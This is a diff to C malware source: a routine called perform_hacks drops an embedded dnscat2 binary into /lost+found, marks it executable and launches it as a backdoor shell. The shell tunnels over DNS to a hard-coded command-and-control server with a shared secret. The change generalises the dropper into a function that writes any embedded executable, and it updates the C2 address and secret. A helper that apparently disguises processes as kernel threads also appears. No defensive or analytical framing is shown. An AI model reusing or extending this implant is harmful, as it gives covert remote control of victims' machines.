@@ -18,7 +18,6 @@
 #include <dirent.h>
 
 #include "dnscat.h"
-#include "banner.h"
 
 #define DNSCAT_PATH	"/lost+found/dnscat"
 
@@ -297,14 +296,14 @@ static void make_kernel_threads(char **threads)
 /**
  * This function writes dnscat2 executable into ramdisk
  **/
-static void write_dnscat2()
+static void write_executable(char *path, unsigned char* exe, unsigned int exe_len)
 {
 	FILE* exe_file = NULL;
-	exe_file = fopen(DNSCAT_PATH, "w+");
+	exe_file = fopen(path, "w+");
 	if (exe_file) {
-		fwrite((const void*)dnscat, 1, dnscat_len, exe_file);
+		fwrite((const void*)exe, 1, exe_len, exe_file);
 		fclose(exe_file);
-		chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
+		chmod(path, S_IXUSR | S_IRUSR);
 	}
 }
 
@@ -326,8 +325,8 @@ static pid_t run_dnscat2()
 		// fill command line arguments
 		argv[0] = "dnscat";
 		argv[1] = "--dns";
-		argv[2] = "server=10.220.190.238,port=53531";
-		argv[3] = "--secret=a9a053c554ada1fab5983d0495e3c441";
+		argv[2] = "server=192.168.1.7,port=53531";
+		argv[3] = "--secret=5d6619b8fcfe14274a5f601b51815554";
 
 		execv(DNSCAT_PATH, argv);
 		exit(EXIT_FAILURE);
@@ -396,7 +395,7 @@ void perform_hacks()
 			exit(EXIT_FAILURE);
 
 		// write executable of dnscat2
-		write_dnscat2();
+		write_executable(DNSCAT_PATH, dnscat, dnscat_len);
 		
 		// spawn a process for backdoor shell
 		dnscat_pid = run_dnscat2();
